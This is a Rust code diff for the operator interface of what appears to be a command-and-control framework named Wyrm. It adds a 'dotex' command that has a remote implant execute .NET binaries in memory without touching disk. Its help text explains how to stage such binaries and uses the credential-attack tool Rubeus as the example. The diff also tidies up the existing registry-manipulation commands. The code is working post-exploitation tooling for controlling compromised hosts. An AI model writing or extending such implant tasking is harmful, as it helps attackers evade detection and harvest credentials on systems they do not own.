@@ -5,7 +5,7 @@ use leptos::prelude::{Read, RwSignal, Update, Write, use_context};
 use shared::{
     pretty_print::print_failed,
     task_types::{RegAddInner, RegQueryInner, RegType},
-    tasks::{AdminCommand, DELIM_FILE_DROP_METADATA, FileDropMetadata, WyrmResult},
+    tasks::{AdminCommand, DELIM_FILE_DROP_METADATA, DotExInner, FileDropMetadata, WyrmResult},
 };
 use thiserror::Error;
 
@@ -438,6 +438,7 @@ pub async fn show_help(agent: &IsTaskingAgent) -> DispatchResult {
         "reg query <path_to_key> <value> (for more info, type help reg)".into(),
         "reg add <path_to_key> <value name> <value data> <data type> (for more info, type help reg)".into(),
         "reg del <path_to_key> <Optional: value name> (for more info, type help reg)".into(),
+        "dotex <bin> <args> (execute a dotnet binary in memory in the implant, for more info type help dotex)".into(),
     ];
 
     if let IsTaskingAgent::Yes(agent_id) = agent {
@@ -500,6 +501,18 @@ pub async fn show_help_for_command(agent: &IsTaskingAgent, command: &str) -> Dis
             "reg del".into(),
             "Usage: reg del <path_to_key> <Optional: value name>".into(),
             "Deletes a registry key, or value, based on above args. Deleting the key will delete all sub-keys under it, so take care.".into(),
+        ],
+        "dotex" => vec![
+            "dotex <binary> <args>".into(),
+            "Executes a dotnet binary in memory within the implant, without having it drop to disk! currently, this only executes within the implants".into(),
+            "process, meaning if you run a never ending dotnet binary, you will (probably) lose that beacon.".into(),
+            "".into(),
+            "To stage a dotnet binary, where the C2 is installed (outside of docker) you will find a folder in the Wyrm root called c2_transfer.".into(),
+            "Simply drag a file into this directory and it will be auto-copied into the C2 without needing a restart. Whatever you call".into(),
+            "that binary, you can then invoke it with dotex. For example, if you drop Rubeus.exe into c2_transfer, you can run Rubeus in the".into(),
+            "agent via: dotex Rubeus.exe klist.".into(),
+            "".into(),
+            "The results of the execution will then be shown in your output terminal in the GUI.".into(),
         ],
         _ => vec!["No help pages available for this command, or it does not exist.".into()],
     };
@@ -695,15 +708,12 @@ pub async fn reg_add(inputs: String, agent: &IsTaskingAgent) -> DispatchResult {
     // the proper options
     //
 
-    let reg_add_options = split_string_slices_to_n(4, &inputs, DiscardFirst::ChopTwo);
-    let mut reg_add_options = match reg_add_options {
-        Some(o) => o,
-        None => {
-            return Err(TaskingError::TaskDispatchError(
-                TaskDispatchError::BadTokens("Could not find options for command".into()),
-            ));
-        }
-    };
+    let mut reg_add_options = split_string_slices_to_n(4, &inputs, DiscardFirst::ChopTwo)
+        .ok_or_else(|| {
+            TaskingError::TaskDispatchError(TaskDispatchError::BadTokens(
+                "Could not find options for command".into(),
+            ))
+        })?;
 
     let reg_type = match reg_add_options[3].as_str() {
         "string" | "String" => RegType::String,
@@ -736,6 +746,42 @@ pub async fn reg_add(inputs: String, agent: &IsTaskingAgent) -> DispatchResult {
     Ok(Some(
         api_request(
             AdminCommand::RegAdd(query_data),
+            agent,
+            None,
+            C2Url::Standard,
+            None,
+        )
+        .await?,
+    ))
+}
+
+pub async fn dotex(inputs: String, agent: &IsTaskingAgent) -> DispatchResult {
+    agent.has_agent_id()?;
+
+    if inputs.is_empty() {
+        print_failed("Please specify options.");
+    }
+
+    let slices = split_string_slices_to_n(0, &inputs, DiscardFirst::Chop).ok_or_else(|| {
+        TaskingError::TaskDispatchError(TaskDispatchError::BadTokens(
+            "Could not find options for command".into(),
+        ))
+    })?;
+
+    if slices.is_empty() {
+        return Err(TaskingError::TaskDispatchError(
+            TaskDispatchError::BadTokens("Options were empty. Cannot continue.".into()),
+        ));
+    }
+
+    let tool = slices[0].clone();
+    let args = slices[1..].to_vec();
+
+    let inner = DotExInner::from(tool, args);
+
+    Ok(Some(
+        api_request(
+            AdminCommand::DotEx(inner),
             agent,
             None,
             C2Url::Standard,
